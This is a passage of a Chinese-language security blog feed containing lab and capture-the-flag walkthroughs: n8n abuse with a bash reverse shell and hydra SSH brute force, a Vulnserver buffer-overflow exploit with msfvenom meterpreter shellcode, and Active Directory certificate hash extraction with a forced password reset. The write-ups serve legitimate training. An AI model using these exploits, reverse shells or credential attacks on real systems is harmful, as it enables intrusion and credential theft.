W/\"7b7-198417d0a9c\"\n|     Content-Type: text/html; charset=utf-8\n|     Content-Length: 1975\n|     Vary: Accept-Encoding\n|     Date: Fri, 25 Jul 2025 12:12:38 GMT\n|     Connection: close\n|     <!DOCTYPE html>\n|     <html lang=\"en\">\n|     <head>\n|     <script type=\"module\" crossorigin src=\"/assets/polyfills-B8p9DdqU.js\"></script>\n...\n8765/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))\n|_http-server-header: Apache/2.4.58 (Ubuntu)\n|_http-title: Apache2 Ubuntu Default Page: It works\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port5678-TCP:V=7.95%I=7%D=7/25%Time=688374B9%P=x86_64-pc-linux-gnu%r(Ge\nSF:tRequest,8DC,\"HTTP/1\\.1\\x20200\\x20OK\\r\\nAccept-Ranges:\\x20bytes\\r\\nCach\nSF:e-Control:\\x20public,\\x20max-age=86400\\r\\nLast-Modified:\\x20Fri,\\x2025\\\nSF:x20Jul\\x202025\\x2012:09:30\\x20GMT\\r\\nETag:\\x20W/\\\"7b7-198417d0a9c\\\"\\r\\n\nSF:Content-Type:\\x20text/html;\\x20charset=utf-8\\r\\nContent-Length:\\x201975\nSF:\\r\\nVary:\\x20Accept-Encoding\\r\\nDate:\\x20Fri,\\x2025\\x20Jul\\x202025\\x201\nSF:2:12:38\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!DOCTYPE\\x20html>\\n<html\nSF:\\x20lang=\\\"en\\\">\\n\\t<head>\\n\\t\\t<script\\x20type=\\\"module\\\"\\x20crossorig\nSF:in\\x20src=\\\"/assets/polyfills-B8p9DdqU\\.js\\\"></script>\\n\\n\\t\\t<meta\\x20\nSF:charset=\\\"utf-8\\\"\\x20/>\\n\\t\\t<meta\\x20http-equiv=\\\"X-UA-Compatible\\\"\\x2\nSF:0content=\\\"IE=edge\\\"\\x20/>\\n\\t\\t<meta\\x20name=\\\"viewport\\\"\\x20content=\\\nSF:\"width=device-width,initial-scale=1\\.0\\\"\\x20/>\\n\\t\\t<link\\x20rel=\\\"icon\n```\n\n### æšä¸¾æµ‹è¯•\n\n`8765` `Apache`é»˜è®¤é¡µé¢\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image1.png)\n\n`5678` `n8n`\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image2.png)\n\n`n8n` å¯ä»¥åå¼¹ `shell`ï¼Œä½†æ˜¯è¦è¿›å…¥åå°ï¼Œå¹¶ä¸”éœ€è¦é‚®ç®±å’Œå¯†ç \n\n## å¯†ç çˆ†ç ´\n\næˆ‘ä¹ˆå¯»æ‰¾ä¸€ä¸‹å“ªé‡Œèƒ½æ‰¾åˆ°ä¿¡æ¯\n\n`8765` æºç ä¸­å¾—åˆ°ä¿¡æ¯\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image3.png)\n\n> usuario@maildelctf.com\nå¸Œæœ›æ‚¨å·²æŒ‰ç…§è¯´æ˜æ›´æ”¹å¯†ç ã€‚\nè¯·è®°ä½ï¼šå¯†ç è‡³å°‘ 8 ä¸ªå­—ç¬¦ï¼Œè‡³å°‘åŒ…å« 1 ä¸ªæ•°å­—å’Œ 1 ä¸ªå¤§å†™å­—æ¯ã€‚\n> \n\nå¾—åˆ°ä¸€ä¸ªé‚®ç®±å’Œå¯†ç ç­–ç•¥\n\né€šè¿‡AI å†™å‡ºæ­£åˆ™è¡¨è¾¾å¼ï¼Œç„¶ååŒ¹é… `rockyou` å‰ `5000` çš„å­—å…¸\n\n```bash\nâœ  NodeCeption head -n 5000 /usr/share/wordlists/rockyou.txt | grep -P '^(?=.*\\d)(?=.*[A-Z]).{8,}$'                                                                          \nPassword1\nPASSWORD1\n```\n\nä½¿ç”¨ `usuario@maildelctf.com`:`Password1` å¯ä»¥ç™»å½•è¿›å»\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image4.png)\n\n## n8n åå°åˆ©ç”¨\n\né€šè¿‡å·¥ä½œæµè¿è¡Œå‘½ä»¤\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image5.png)\n\næµ‹è¯•ä¸€ä¸‹\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image6.png)\n\næˆåŠŸè®¿é—®\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image7.png)\n\nåå¼¹ `shell` ï¼Œè¿™é‡Œæ²¡æ³•ç”¨`nc` å¼¹\n\n```bash\n/bin/bash -c 'bash -i >& /dev/tcp/192.168.56.5/1234 0>&1'\n```\n\n![image.png](/post-images/TheHackersLabsNodeCeption/image8.png)\n\næ‹¿åˆ°ç«‹è¶³ç‚¹\n\n```bash\nâœ  NodeCeption nc -lvp 1234\nlistening on [any] 1234 ...\n192.168.56.88: inverse host lookup failed: Unknown host\nconnect to [192.168.56.5] from (UNKNOWN) [192.168.56.88] 48536\nbash: cannot set terminal process group (2231): Inappropriate ioctl for device\nbash: no job control in this shell\nthl@nodeception:~$ \n```\n\nå½“å‰ç›®å½•ä¸­å¯ä»¥æ‹¿åˆ° `user.txt`\n\n```bash\nthl@nodeception:~$ cat user.txt \nTHL_wxxxxxxxxxxxxxxxxxxx\n```\n\n## æƒé™æå‡\n\nä¸€çœ‹ç”¨æˆ·ç»„\n\n```bash\nthl@nodeception:~$ id\nuid=1000(thl) gid=1000(thl) groups=1000(thl),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),101(lxd)\n```\n\nå†çœ‹ `sudo` æƒé™\n\n```bash\nthl@nodeception:~$ sudo -l\nMatching Defaults entries for thl on nodeception:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty\n\nUser thl may run the following commands on nodeception:\n    (ALL) NOPASSWD: /usr/bin/vi\n    (ALL : ALL) ALL\n```\n\nä½†æ˜¯æ‰§è¡Œæ—¶éœ€è¦æˆ‘ä»¬æä¾›å¯†ç \n\nå°è¯•`hydra`çˆ†ç ´\n\n```bash\nâœ  NodeCeption hydra -l thl -P /usr/share/wordlists/rockyou.txt -t 8 192.168.56.88 ssh\nHydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).\n\nHydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-07-25 20:54:04\n[DATA] max 8 tasks per 1 server, overall 8 tasks, 14344399 login tries (l:1/p:14344399), ~1793050 tries per task\n[DATA] attacking ssh://192.168.56.88:22/\n[22][ssh] host: 192.168.56.88   login: thl   password: basketball\n1 of 1 target successfully completed, 1 valid password found\nHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-07-25 20:54:27\n```\n\nå¾—åˆ°å¯†ç  `basketball`\n\nç»“æŸ\n\n```bash\nthl@nodeception:~$ sudo cat /root/root.txt\n[sudo] password for thl: \nTHL_xxxxxxxxxxxxxxxxxxx\n```\n\n## æ€»ç»“\n\næ¢­å“ˆ",
            "url": "https://www.sunsetaction.top/2025/07/25/TheHackersLabsNodeCeption",
            "title": "TheHackersLabs - NodeCeption",
            "summary": "NodeCeption https://labs.thehackerslabs.com/machine/118 Recon PortScan æšä¸¾æµ‹è¯• 8765 Apacheé»˜è®¤é¡µé¢ 5678 n8n n8n å¯ä»¥åå¼¹ shellï¼Œä½†æ˜¯è¦è¿›å…¥åå°ï¼Œå¹¶ä¸”éœ€è¦é‚®ç®±å’Œå¯†ç  å¯†ç çˆ†ç ´ æˆ‘ä¹ˆå¯»æ‰¾ä¸€ä¸‹å“ªé‡Œèƒ½æ‰¾åˆ°...",
            "date_modified": "2025-07-25T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Linux",
                "n8n",
                "hydra"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas",
            "content_html": "\n# Pildoritas\n\n> https://labs.thehackerslabs.com/machine/67\n> \n\n![image.png](/post-images/TheHackersLabsPildoritas/image.png)\n\n## Recon\n\n### PortScan\n\n```bash\nâœ  Pildoritas nmap -sn 192.168.56.0/24               \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nNmap scan report for 192.168.56.1\nHost is up (0.00052s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report for 192.168.56.2\nHost is up (0.00037s latency).\nMAC Address: 08:00:27:31:BB:E1 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.93\nHost is up (0.00069s latency).\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nNmap scan report for 192.168.56.5\nHost is up.\nNmap done: 256 IP addresses (4 hosts up) scanned in 6.09 seconds\n```\n\nè¿™æ¬¡ä¸æ‰“ `AD` åŸŸ\n\n```bash\nâœ  Pildoritas nmap -sT -min-rate 10000 -p- 192.168.56.93    \nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:00 CST\nWarning: 192.168.56.93 giving up on port because retransmission cap hit (10).\nNmap scan report for 192.168.56.93\nHost is up (0.00029s latency).\nNot shown: 65267 closed tcp ports (conn-refused), 257 filtered tcp ports (no-response)\nPORT      STATE SERVICE\n80/tcp    open  http\n135/tcp   open  msrpc\n139/tcp   open  netbios-ssn\n445/tcp   open  microsoft-ds\n9999/tcp  open  abyss\n49152/tcp open  unknown\n49153/tcp open  unknown\n49154/tcp open  unknown\n49155/tcp open  unknown\n49156/tcp open  unknown\n49157/tcp open  unknown\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 19.78 seconds\n```\n\n```bash\nâœ  Pildoritas nmap -sT -A -p $(cat port | awk -F '/' '{print $1}' | paste -sd ',') 192.168.56.93\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 22:11 CST                                                                                                                                 \nNmap scan report for 192.168.56.93                                                              \nHost is up (0.00035s latency).\n\nPORT     STATE SERVICE       VERSION\n80/tcp   open  http          Microsoft IIS httpd 7.0\n|_http-title: 404: archivo o directorio no encontrado.\n|_http-server-header: Microsoft-IIS/7.0\n| http-methods: \n|_  Potentially risky methods: TRACE\n135/tcp  open  msrpc         Microsoft Windows RPC\n139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n9999/tcp open  vulnserver    Vulnserver\nMAC Address: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nDevice type: general purpose\nRunning: Microsoft Windows 2008|7|Vista|8.1\nOS CPE: cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista cpe:/o:microsoft:windows_8.1\nOS details: Microsoft Windows Vista SP2 or Windows 7 or Windows Server 2008 R2 or Windows 8.1\nNetwork Distance: 1 hop\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-security-mode: \n|   2:0:2: \n|_    Message signing enabled but not required\n|_clock-skew: 6h59m57s\n| smb2-time: \n|   date: 2025-07-24T21:12:18\n|_  start_date: 2025-07-24T20:57:33\n|_nbstat: NetBIOS name: WIN-LVJNVVHBWSR, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:83:27:28 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nTRACEROUTE\nHOP RTT     ADDRESS\n1   0.35 ms 192.168.56.93\n```\n\n### æšä¸¾æµ‹è¯•\n\n`SMB` åŒ¿åæšä¸¾\n\n```bash\nâœ  Pildoritas smbclient -L 192.168.56.93 -U anonymous\nPassword for [WORKGROUP\\anonymous]:\nsession setup failed: NT_STATUS_LOGON_FAILUR\n```\n\n## Vulnserver\n\nä»`nmap` ä¸­çš„æ‰«æç»“æœèƒ½çŸ¥é“æ­å»ºç€ `Vulnserver`\n\né¡¹ç›®é“¾æ¥ï¼šhttps://github.com/stephenbradshaw/vulnserver\n\n```bash\nâœ  Pildoritas nc 192.168.56.93 9999 \nWelcome to Vulnerable Server! Enter HELP for help.\n```\n\nç›´æ¥ä»ç½‘ä¸Šæ‰¾ `POC` ï¼šhttps://forum.butian.net/share/4013\n\nå°†é‡Œé¢çš„`payload` æ¢æˆè‡ªå·±çš„å°±è¡Œ\n\n```bash\nmsfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.5 LPORT=1234 -f c -e x86/shikata\\_ga\\_nai -b \"\\\\x00\" -f python -v shellcode\n```\n\n```bash\n#!/usr/bin/python\n\nimport socket\nimport sys\nfrom struct import pack\n\ntry:\n    server = sys.argv[1]\n    port = 9999\n    size = 2006\n\n    shellcode = b\"\\x90\" * 20\n    \n    // æ›¿æ¢\n    shellcode += b\"\\xd9\\xc0\\xd9\\x74\\x24\\xf4\\x58\\x31\\xc9\\xbb\\x6b\"\n    shellcode += b\"\\xc5\\x71\\xf0\\xb1\\x59\\x31\\x58\\x19\\x83\\xe8\\xfc\"\n    shellcode += b\"\\x03\\x58\\x15\\x89\\x30\\x8d\\x18\\xc2\\xbb\\x6e\\xd9\"\n    shellcode += b\"\\xbc\\x32\\x8b\\xe8\\xee\\x21\\xdf\\x59\\x3e\\x21\\x8d\"\n    shellcode += b\"\\x51\\xb5\\x67\\x26\\x5b\\x36\\x0c\\x34\\xb3\\xc7\\xa4\"\n    shellcode += b\"\\xf3\\xe5\\xe6\\x0a\\xaf\\xd6\\x69\\xf7\\xb2\\x0a\\x49\"\n    shellcode += b\"\\xc6\\x7c\\x5f\\x88\\x0f\\xcb\\x15\\x65\\xdd\\x9b\\x5e\"\n    shellcode += b\"\\x2b\\xf2\\xa8\\x23\\xf7\\xf3\\x7e\\x28\\x47\\x8c\\xfb\"\n    shellcode += b\"\\xef\\x33\\x20\\x05\\x20\\x30\\xf0\\x1d\\x4b\\x1e\\x21\"\n    shellcode += b\"\\x1f\\x98\\xce\\xa4\\xd6\\x6a\\xd2\\x97\\x17\\xdb\\xa1\"\n    shellcode += b\"\\xec\\x6c\\xdd\\x63\\x3d\\xb3\\x1f\\x44\\x33\\x9f\\xa1\"\n    shellcode += b\"\\x9d\\x74\\x3f\\xd4\\xd5\\x86\\xc2\\xef\\x2e\\xf4\\x18\"\n    shellcode += b\"\\x65\\xb0\\x5e\\xea\\xdd\\x14\\x5e\\x3f\\xbb\\xdf\\x6c\"\n    shellcode += b\"\\xf4\\xcf\\x87\\x70\\x0b\\x03\\xbc\\x8d\\x80\\xa2\\x12\"\n    shellcode += b\"\\x04\\xd2\\x80\\xb6\\x4c\\x80\\xa9\\xef\\x28\\x67\\xd5\"\n    shellcode += b\"\\xef\\x95\\xd8\\x73\\x64\\x37\\x0e\\x03\\x85\\xc7\\x2f\"\n    shellcode += b\"\\x59\\x11\\x0b\\xe2\\x62\\xe1\\x03\\x75\\x10\\xd3\\x8c\"\n    shellcode += b\"\\x2d\\xbe\\x5f\\x44\\xe8\\x39\\xd6\\x42\\x0b\\x95\\x50\"\n    shellcode += b\"\\x02\\xf5\\x16\\xa0\\x0a\\x32\\x42\\xf0\\x24\\x93\\xeb\"\n    shellcode += b\"\\x9b\\xb4\\x1c\\x3e\\x31\\xbf\\x8a\\x01\\x6d\\x87\\x4f\"\n    shellcode += b\"\\xea\\x6f\\xf8\\x4b\\x38\\xe6\\x1e\\x03\\xec\\xa8\\x8e\"\n    shellcode += b\"\\xe4\\x5c\\x08\\x7f\\x8d\\xb6\\x87\\xa0\\xad\\xb8\\x42\"\n    shellcode += b\"\\xc9\\x44\\x57\\x3a\\xa1\\xf0\\xce\\x67\\x39\\x60\\x0e\"\n    shellcode += b\"\\xb2\\x47\\xa2\\x84\\x36\\xb7\\x6d\\x6d\\x33\\xab\\x9a\"\n    shellcode += b\"\\x0a\\xbb\\x33\\x5b\\xbf\\xbb\\x59\\x5f\\x69\\xec\\xf5\"\n    shellcode += b\"\\x5d\\x4c\\xda\\x59\\x9d\\xbb\\x59\\x9d\\x61\\x3a\\x6b\"\n    shellcode += b\"\\xd5\\x54\\xa8\\xd3\\x81\\x98\\x3c\\xd3\\x51\\xcf\\x56\"\n    shellcode += b\"\\xd3\\x39\\xb7\\x02\\x80\\x5c\\xb8\\x9e\\xb5\\xcc\\x2d\"\n    shellcode += b\"\\x21\\xef\\xa1\\xe6\\x49\\x0d\\x9f\\xc1\\xd5\\xee\\xca\"\n    shellcode += b\"\\x51\\x11\\x10\\x88\\x7d\\xba\\x78\\x72\\x3e\\x3a\\x78\"\n    shellcode += b\"\\x18\\xbe\\x6a\\x10\\xd7\\x91\\x85\\xd0\\x18\\x38\\xce\"\n    shellcode += b\"\\x78\\x92\\xad\\xbc\\x19\\xa3\\xe7\\x61\\x87\\xa4\\x04\"\n    shellcode += b\"\\xba\\x38\\xde\\x65\\x3d\\xb9\\x1f\\x6c\\x5a\\xba\\x1f\"\n    shellcode += b\"\\x90\\x5c\\x87\\xc9\\xa9\\x2a\\xc6\\xc9\\x8d\\x25\\x7d\"\n    shellcode += b\"\\x6f\\xa7\\xaf\\x7d\\x23\\xb7\\xe5\"\n\n    inputBuffer = b\"TRUN .\" + b\"\\x41\" * size + b\"\\xaf\\x11\\x50\\x62\" + shellcode\n\n    buf = inputBuffer\n\n    print(\"Sending evil buffer...\")\n\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect((server, port))\n    s.send(buf)\n    s.close()\n\n    print(\"Done!\")\n\nexcept socket.error:\n    print(\"Could not connect!\")\n```\n\nè¿è¡ŒåæˆåŠŸæ‹¿åˆ° `Shell`\n\n![image.png](/post-images/TheHackersLabsPildoritas/image1.png)\n\nç›´æ¥å°±æ˜¯`SYSTEM` æƒé™\n\n```bash\nmeterpreter > ls\nListing: C:\\Users\\Administrador\\Desktop\n=======================================\n\nMode              Size   Type  Last modified              Name\n----              ----   ----  -------------              ----\n100666/rw-rw-rw-  282    fil   2024-07-22 00:38:48 +0800  desktop.ini\n100666/rw-rw-rw-  1646   fil   2024-07-22 01:00:39 +0800  essfunc.c\n100666/rw-rw-rw-  16601  fil   2024-07-22 01:00:11 +0800  essfunc.dll\n100666/rw-rw-rw-  36     fil   2024-07-22 01:46:33 +0800  root.txt\n100666/rw-rw-rw-  9033   fil   2024-07-22 01:00:31 +0800  vulnserver.c\n100777/rwxrwxrwx  29624  fil   2024-07-22 00:59:45 +0800  vulnserver.exe\n\nmeterpreter > getuid\nServer username: NT AUTHORITY\\SYSTEM\n\nmeterpreter > cat root.txt\nbe3751d9c6dxxxxxxxxxxxxxxxxxxxxxxx  -\n\nmeterpreter > cat user.txt\n3163xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx  -\n```\n\n## æ€»ç»“\n\nä¸æ¸…æ¥šæ˜¯å¦æ˜¯è®©ç›´æ¥æ¢­å“ˆ\n\nè¿˜æ˜¯æœ‰é¢„æœŸåšæ³•\n\næ„Ÿè§‰æ€ªæ€ªçš„",
            "url": "https://www.sunsetaction.top/2025/07/24/TheHackersLabsPildoritas",
            "title": "TheHackersLabs - Pildoritas",
            "summary": "Pildoritas https://labs.thehackerslabs.com/machine/67 Recon PortScan è¿™æ¬¡ä¸æ‰“ AD åŸŸ æšä¸¾æµ‹è¯• SMB åŒ¿åæšä¸¾ Vulnserver ä»nmap ä¸­çš„æ‰«æç»“æœèƒ½çŸ¥é“æ­å»ºç€ Vulnserver é¡¹ç›®é“¾æ¥ï¼šhttps://git...",
            "date_modified": "2025-07-24T00:00:00.000Z",
            "author": {
                "name": "Sunset",
                "url": "https://www.sunsetaction.top/about"
            },
            "tags": [
                "é¶æœº",
                "TheHackersLabs",
                "Vulnserver"
            ]
        },
        {
            "id": "https://www.sunsetaction.top/2025/07/24/HackTheBoxMachine - Scepter",
            "content_html": "# Machine - Scepterl\n\n> https://app.hackthebox.com/machines/Scepter | `Hard`\n> \n\nPSï¼šä¸€ç›´ä»¥ä¸º Season è¿‡äº†ä¹‹åå°±ä¸èƒ½ç™½å«–é¶æœºäº†â€¦å¯¼è‡´é”™è¿‡äº†ä¸¤å‘¨çš„é¶æœºâ€¦å‘œå‘œå‘œ\n\n## å‰æœŸè¸©ç‚¹\n\n```bash\nâœ  Scepter nmap -sT -min-rate 10000 -p- 10.10.11.65        \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-24 10:18 EDT\nNmap scan report for 10.10.11.65\nHost is up (0.30s latency).\nNot shown: 65306 filtered tcp ports (no-response), 224 closed tcp ports (conn-refused)\nPORT    STATE SERVICE\n53/tcp  open  domain\n111/tcp open  rpcbind\n135/tcp open  msrpc\n139/tcp open  netbios-ssn\n445/tcp open  microsoft-ds\n\nNmap done: 1 IP address (1 host up) scanned in 66.89 seconds\n```\n\n`Windows` é¶æœºçš„ç«¯å£ï¼Œä½†ä¸ä¸€å®šæ˜¯åŸŸæ§ä¸»æœºï¼ˆPS:åé¢æ‰çŸ¥é“æˆ‘æ‰«æå‡ºæ¥çš„ç«¯å£shaoï¼‰\n\n```bash\nâœ  Scepter nmap -sT -A -T4 -O -p 53,111,135,139,445 10.10.11.65\nNmap scan report for 10.10.11.65\nHost is up (0.40s latency).\n\nPORT    STATE SERVICE       VERSION\n53/tcp  open  domain        Simple DNS Plus\n111/tcp open  rpcbind?\n| rpcinfo:\n|   program version    port/proto  service\n|   100003  2,3         2049/udp6  nfs\n|   100003  2,3,4       2049/tcp6  nfs\n|   100003  4           2049/tcp   nfs\n|   100005  1,2,3       2049/tcp   mountd\n|   100005  1,2,3       2049/tcp6  mountd\n|   100005  1,2,3       2049/udp   mountd\n|   100005  1,2,3       2049/udp6  mountd\n|   100021  1,2,3,4     2049/tcp   nlockmgr\n|   100021  1,2,3,4     2049/tcp6  nlockmgr\n|   100021  1,2,3,4     2049/udp   nlockmgr\n|   100021  1,2,3,4     2049/udp6  nlockmgr\n|   100024  1           2049/tcp   status\n|   100024  1           2049/tcp6  status\n|   100024  1           2049/udp   status\n|_  100024  1           2049/udp6  status\n135/tcp open  msrpc         Microsoft Windows RPC\n139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn\n445/tcp open  microsoft-ds?\nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port\nAggressive OS guesses: Microsoft Windows Server 2019 (96%), Microsoft Windows 10 1709 - 1909 (93%), Microsoft Windows Server 2012 (93%), Microsoft Windows Vista SP1 (92%), Microsoft Windows Longhorn (92%), Micro\nsoft Windows 10 1709 - 1803 (91%), Microsoft Windows 10 1809 - 2004 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows Server 2012 R2 Update 1 (91%), Microsoft Windows Server 2016 build 10586 - 143\n93 (91%)\nNo exact OS matches for host (test conditions non-ideal).\nNetwork Distance: 2 hops\nService Info: OS: Windows; CPE: cpe:/o:microsoft:windows\n\nHost script results:\n| smb2-time:\n|   date: 2025-04-24T22:05:35\n|_  start_date: N/A\n|_clock-skew: 7h40m16s\n| smb2-security-mode:\n|   3:1:1:\n|_    Message signing enabled and required\n\nTRACEROUTE (using proto 1/icmp)\nHOP RTT       ADDRESS\n1   464.44 ms 10.10.16.1\n2   291.53 ms 10.10.11.65\n\nOS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 251.59 seconds\n```\n\n## NFS\n\n```bash\nrpcdump.py scepter.htb -target-ip 10.10.11.65\n```\n\nå¾ˆå¤šçš„ä¿¡æ¯ï¼Œå°è¯•ä»é‡Œé¢è·å–æœ‰ç”¨çš„ä¿¡æ¯ï¼Œç»“æœä¿å­˜åœ¨ `rpcdump_resule.txt`\n\nä¸»æœºä¸º `DC01.scepter.htb` ï¼Œé‚£å°±èƒ½ç¡®å®šæ˜¯åŸŸæ§äº†\n\nNMAP ä¸­æ‰«æå‡ºäº†é¶æœºå¼€å¯äº† NFSï¼Œå°è¯•ä¸€ä¸‹åŒ¿åè®¿é—®ã€‚\n\n```bash\nâœ  Scepter showmount -e 10.10.11.65\nExport list for 10.10.11.65:\n/helpdesk (everyone)\n\nâœ  Scepter mkdir nfs\nâœ  Scepter sudo mount -t nfs 10.10.11.65:/helpdesk /root/Desktop/test/Scepter/nfs\n\nâœ  Scepter cd nfs   \nâœ  nfs ls\nbaker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx\n```\n\n## To D.baker\n\nä½¿ç”¨ openssl æŸ¥çœ‹ `baker.crt` çš„å†…å®¹\n\n```bash\nâœ  nfs_backup openssl x509 -in baker.crt -text -noout\nCertificate:                                                                                                                                                                                                    \n    Data:                                 \n        Version: 3 (0x2)                                                                                                                                                                                        \n        Serial Number:            \n            62:00:00:00:32:e1:a5:c3:91:51:31:09:7b:00:00:00:00:00:32\n        Signature Algorithm: sha256WithRSAEncryption \n        Issuer: DC=htb, DC=scepter, CN=scepter-DC01-CA\n        Validity                       \n            Not Before: Nov  2 01:13:46 2024 GMT                                                        \n            Not After : Nov  2 01:13:46 2025 GMT\n        Subject: DC=htb, DC=scepter, CN=Users, CN=d.baker, emailAddress=d.baker@scepter.htb\n        Subject Public Key Info:         \n            Public Key Algorithm: rsaEncryption\n                Public-Key: (2048 bit)                                         \n```\n\nå°è¯•ç”Ÿæˆ `pfx` æ–‡ä»¶ï¼Œç”¨äºè®¤è¯çš„å¯†ç æ˜¯ `newpassword` ï¼ˆæš‚æ—¶ä¸çŸ¥é“å¦‚ä½•è·å¾—ï¼Œå¼±å¯†ç ï¼Ÿï¼‰ï¼Œæ–°è®¾ç½®å¯†ç ä¸ºç©ºå¯†ç \n\n```bash\nâœ  nfs_backup openssl pkcs12 -export -out baker.pfx -inkey baker.key -in baker.crt\nEnter pass phrase for baker.key:\nEnter Export Password:\nVerifying - Enter Export Password:\n```\n\né€šè¿‡ `certipy-ad` æå–ç”¨æˆ· hash\n\n```bash\nâœ  Scepter sudo ntpdate 10.10.11.65 | certipy-ad auth -pfx baker.pfx -dc-ip 10.10.11.65 -domain scepter.htb -username d.baker\nCertipy v4.8.2 - by Oliver Lyak (ly4k)\n\n[*] Using principal: d.baker@scepter.htb\n[*] Trying to get TGT...\n[*] Got TGT\n[*] Saved credential cache to 'd.baker.ccache'\n[*] Trying to retrieve NT hash for 'd.baker'\n[*] Got hash for 'd.baker@scepter.htb': aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n```\n\n```bash\naad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce\n```\n\næ£€æŸ¥å¯†ç æœ‰æ•ˆæ€§\n\n```bash\nâœ  Scepter nxc smb 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nSMB         10.10.11.65     445    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n```\n\n```bash\nâœ  Scepter nxc ldap 10.10.11.65 -u d.baker -H 18b5fb0d99e7a475316213c15b6f22ce\nSMB         10.10.11.65     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:scepter.htb) (signing:True) (SMBv1:False)\nLDAP        10.10.11.65     389    DC01             [+] scepter.htb\\d.baker:18b5fb0d99e7a475316213c15b6f22ce \n```\n\n```bash\nâœ  Scepter bloodhound-python -u 'd.baker' -d 'scepter.htb' -ns 10.10.11.65 --zip -c All -dc 'DC01.scepter.htb' --hashes 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce'   \nINFO: Found AD domain: scepter.htb\nINFO: Getting TGT for user\nWARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: unpack requires a buffer of 4 bytes\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 1 domains\nINFO: Found 1 domains in the forest\nINFO: Found 1 computers\nINFO: Connecting to LDAP server: DC01.scepter.htb\nINFO: Found 11 users\nINFO: Found 57 groups\nINFO: Found 2 gpos\nINFO: Found 3 ous\nINFO: Found 19 containers\nINFO: Found 0 trusts\nINFO: Starting computer enumeration with 10 workers\nINFO: Querying computer: dc01.scepter.htb\nWARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host timed out.\nINFO: Done in 00M 27S\nINFO: Compressing output into 20250425062047_bloodhound.zip\n```\n\n## To A.carter\n\n### æƒé™æ»¥ç”¨\n\nBloodHoundåˆ†æï¼Œ`d.baker` å±äº `STAFF ACCESS CERTICICATE` çš„\n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image.png)\n\nå› ä¸ºè¿™ä¸ªå…³ç³»ï¼Œ`d.baker` å¯ä»¥ä¿®æ”¹ `a.carter` çš„å¯†ç \n\n![image.png](/post-images/HackTheBoxMachine%20-%20Scepter/image1.png)\n\nä¿®æ”¹å¯†ç  `123456`\n\n```bash\nâœ  nfs_backup changepasswd.py 'scepter.htb/a.carter@10.10.11.65' -newpass 123456 -altuser 'd.baker' -althash 'aad3b435b51404eeaad3b435b51404ee:18b5fb0d99e7a475316213c15b6f22ce' -reset\nImpacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies \n\n[*] Setting the password of scepter.htb\\a.carter as scepter.htb\\d.baker\n[*] Connecting to DCE/RPC as scepter.htb\\d.baker\n[*] Password was changed successfully.\n[!] User no longer has valid AES keys for Kerberos, until they change their password again.\n```\n\næ£€éªŒæ˜¯å¦ä¿®æ”¹æˆåŠŸ\n\n```bash\nâœ  